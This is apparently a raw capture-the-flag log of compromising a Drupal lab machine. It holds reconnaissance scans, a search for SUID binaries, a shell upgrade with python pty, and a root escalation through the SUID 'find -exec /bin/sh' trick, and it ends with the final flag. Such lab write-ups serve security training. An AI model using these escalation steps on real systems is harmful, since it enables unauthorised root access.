@@ -1,0 +1,373 @@
+--------------------------nmap result--------------------------------
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 00:15 EDT
+Nmap scan report for 192.168.242.129
+Host is up (0.00044s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
+|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
+|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
+80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.2.22 (Debian)
+|_http-title: Welcome to Drupal Site | Drupal Site
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          35938/tcp6  status
+|   100024  1          37866/udp   status
+|   100024  1          45265/udp6  status
+|_  100024  1          60683/tcp   status
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
+
+----------------------found in robots.txt-------------------------
+don't allow path is
+# Directories
+Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /INSTALL.sqlite.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# Paths (clean URLs)
+Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+Disallow: /user/logout/
+# Paths (no clean URLs)
+Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+Disallow: /?q=user/logout/
+
+---------------------------gobuster result------------------------------------
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.242.129:80/
+[+] Threads:        10
+[+] Wordlist:       NOTallow
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/19 02:51:01 Starting gobuster
+===============================================================
+//misc/ (Status: 403)
+//modules/ (Status: 403)
+//scripts/ (Status: 403)
+//profiles/ (Status: 403)
+//themes/ (Status: 403)
+//INSTALL.pgsql.txt (Status: 200)
+//INSTALL.mysql.txt (Status: 200)
+//MAINTAINERS.txt (Status: 200)
+//UPGRADE.txt (Status: 200)
+//LICENSE.txt (Status: 200)
+//INSTALL.txt (Status: 200)
+//INSTALL.sqlite.txt (Status: 200)
+//includes/ (Status: 403)
+//install.php (Status: 200)
+//xmlrpc.php (Status: 200)
+//cron.php (Status: 403)
+//node/add/ (Status: 403)
+//admin/ (Status: 403)
+//filter/tips/ (Status: 200)
+//search/ (Status: 403)
+//update.php (Status: 403)
+//user/register/ (Status: 200)
+//user/password/ (Status: 200)
+//user/login/ (Status: 200)
+//user/logout/ (Status: 403)
+//?q=admin/ (Status: 403)
+//?q=node/add/ (Status: 403)
+//?q=filter/tips/ (Status: 200)
+//?q=search/ (Status: 403)
+//?q=user/password/ (Status: 200)
+//?q=user/register/ (Status: 200)
+//?q=user/logout/ (Status: 403)
+//?q=user/login/ (Status: 200)
+/.bashrc (Status: 403)
+/.cvs (Status: 403)
+/.bash_history (Status: 403)
+/.forward (Status: 403)
+/.cvsignore (Status: 403)
+/.history (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/.listing (Status: 403)
+/.passwd (Status: 403)
+/.perf (Status: 403)
+/.profile (Status: 403)
+/.rhosts (Status: 403)
+/.ssh (Status: 403)
+/.subversion (Status: 403)
+/.svn (Status: 403)
+/.web (Status: 403)
+/0 (Status: 200)
+/ADMIN (Status: 403)
+/Admin (Status: 403)
+/Entries (Status: 403)
+/LICENSE (Status: 200)
+/README (Status: 200)
+/Root (Status: 403)
+/Search (Status: 403)
+/admin (Status: 403)
+/batch (Status: 403)
+/cgi-bin/ (Status: 403)
+/includes (Status: 301)
+/misc (Status: 301)
+/modules (Status: 301)
+/node (Status: 200)
+/profiles (Status: 301)
+/robots.txt (Status: 200)
+/robots (Status: 200)
+/scripts (Status: 301)
+/search (Status: 403)
+/server-status (Status: 403)
+/sites (Status: 301)
+/themes (Status: 301)
+/user (Status: 200)
+
+
+---------------------------------wpscan result----------------------------------------------------
+ wpscan --url http://192.168.242.129 --wp-content-dir /user --force                    4 ⨯
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.6
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://192.168.242.129/ [192.168.242.129]
+[+] Started: Sat Sep 19 03:46:24 2020
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.2.22 (Debian)
+ |  - X-Powered-By: PHP/5.4.45-0+deb7u14
+ |  - Content-Language: en
+ |  - X-Generator: Drupal 7 (http://drupal.org)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://192.168.242.129/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.242.129/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] A backup directory has been found: http://192.168.242.129/user/backup-db/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 70%
+ | Reference: https://github.com/wpscanteam/wpscan/issues/422
+
+[+] This site has 'Must Use Plugins': http://192.168.242.129/user/mu-plugins/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 80%
+ | Reference: http://codex.wordpress.org/Must_Use_Plugins
+
+Fingerprinting the version - Time: 00:00:25 <=============> (463 / 463) 100.00% Time: 00:00:25
+[i] The WordPress version could not be detected.
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <=================> (21 / 21) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Sat Sep 19 03:46:52 2020
+[+] Requests Done: 486
+[+] Cached Requests: 49
+[+] Data Sent: 96.949 KB
+[+] Data Received: 215.362 KB
+[+] Memory used: 152.605 MB
+[+] Elapsed time: 00:00:27
+
+---------------------------droopescan result-------------------------------------------
+┌──(kali㉿EsonhughKALI-Desktop)-[~]
+└─$ droopescan scan drupal -u 192.168.242.129
+[+] Plugins found:                                                              
+    ctools http://192.168.242.129/sites/all/modules/ctools/
+        http://192.168.242.129/sites/all/modules/ctools/LICENSE.txt
+        http://192.168.242.129/sites/all/modules/ctools/API.txt
+    views http://192.168.242.129/sites/all/modules/views/
+        http://192.168.242.129/sites/all/modules/views/README.txt
+        http://192.168.242.129/sites/all/modules/views/LICENSE.txt
+    profile http://192.168.242.129/modules/profile/
+    php http://192.168.242.129/modules/php/
+    image http://192.168.242.129/modules/image/
+
+[+] Themes found:
+    seven http://192.168.242.129/themes/seven/
+    garland http://192.168.242.129/themes/garland/
+
+[+] Possible version(s):
+    7.22
+    7.23
+    7.24
+    7.25
+    7.26
+
+[+] Possible interesting urls found:
+    Default admin - http://192.168.242.129/user/login
+
+[+] Scan finished (0:05:01.892400 elapsed)
+
+find / -perm -u=s -type f 2>/dev/null
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs
+user:www-data
+
+
+ls -al 
+total 408
+drwxr-xr-x  3 www-data www-data   4096 Nov 21  2013 .
+drwxr-xr-x 42 www-data www-data   4096 Nov 21  2013 ..
+drwxr-xr-x  2 www-data www-data   4096 Nov 21  2013 tests
+-rw-r--r--  1 www-data www-data    595 Nov 21  2013 user-picture.tpl.php
+-rw-r--r--  1 www-data www-data   1001 Nov 21  2013 user-profile-category.tpl.php
+-rw-r--r--  1 www-data www-data    918 Nov 21  2013 user-profile-item.tpl.php
+-rw-r--r--  1 www-data www-data   1689 Nov 21  2013 user-profile.tpl.php
+-rw-r--r--  1 www-data www-data    510 Nov 21  2013 user-rtl.css
+-rw-r--r--  1 www-data www-data  39444 Nov 21  2013 user.admin.inc
+-rw-r--r--  1 www-data www-data  15764 Nov 21  2013 user.api.php
+-rw-r--r--  1 www-data www-data   1827 Nov 21  2013 user.css
+-rw-r--r--  1 www-data www-data    356 Nov 21  2013 user.info
+-rw-r--r--  1 www-data www-data  29469 Nov 21  2013 user.install
+-rw-r--r--  1 www-data www-data   6568 Nov 21  2013 user.js
+-rw-r--r--  1 www-data www-data 141243 Nov 21  2013 user.module
+-rw-r--r--  1 www-data www-data  21779 Nov 21  2013 user.pages.inc
+-rw-r--r--  1 www-data www-data   2723 Nov 21  2013 user.permissions.js
+-rw-r--r--  1 www-data www-data  99132 Nov 21  2013 user.test
+-rw-r--r--  1 www-data www-data   4093 Nov 21  2013 user.tokens.inc
+file *
+tests:                         directory
+user-picture.tpl.php:          PHP script, ASCII text
+user-profile-category.tpl.php: PHP script, ASCII text
+user-profile-item.tpl.php:     PHP script, ASCII text
+user-profile.tpl.php:          PHP script, ASCII text
+user-rtl.css:                  ASCII text
+user.admin.inc:                PHP script, ASCII text, with very long lines
+user.api.php:                  PHP script, ASCII text
+user.css:                      ASCII text
+user.info:                     ASCII text
+user.install:                  PHP script, ASCII text, with very long lines
+user.js:                       ASCII text
+user.module:                   PHP script, ASCII text, with very long lines
+user.pages.inc:                PHP script, ASCII text, with very long lines
+user.permissions.js:           ASCII text
+user.test:                     C++ source, UTF-8 Unicode text, with very long lines
+user.tokens.inc:               PHP script, ASCII text
+pwd
+/var/www/modules/user
+
+
+root      3465  3363  0 19:49 pts/0    00:00:00 procmail
+www-data  3466  3356  0 19:50 ?        00:00:00 [sh] <defunct>
+www-data  3467     1  0 19:50 ?        00:00:00 /bin/sh
+www-data  3470  3467  0 19:51 ?        00:00:00 python -c import pty;pty.spawn("/bin/bash")
+www-data  3471  3470  0 19:51 pts/1    00:00:00 /bin/bash
+root      3481  3471  0 20:00 pts/1    00:00:00 procmail -t
+www-data  3490  3356  0 20:07 ?        00:00:00 sh -c /bin/sh 
+www-data  3491  3490  0 20:07 ?        00:00:00 /bin/sh
+root      3620     2  0 20:44 ?        00:00:00 [flush-8:0]
+root      3625  3491  0 20:48 ?        00:00:00 find . -exec /bin/sh ; -quit
+root      3626  3625  0 20:48 ?        00:00:00 /bin/sh
+root      3635     2  0 20:49 ?        00:00:00 [kworker/0:0]
+root      3639  3626  0 20:54 ?        00:00:00 ps -ef
+
+cd /root
+
+ls
+thefinalflag.txt
+
+cat thefinalflag.txt
+Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+
+-------------success-------------
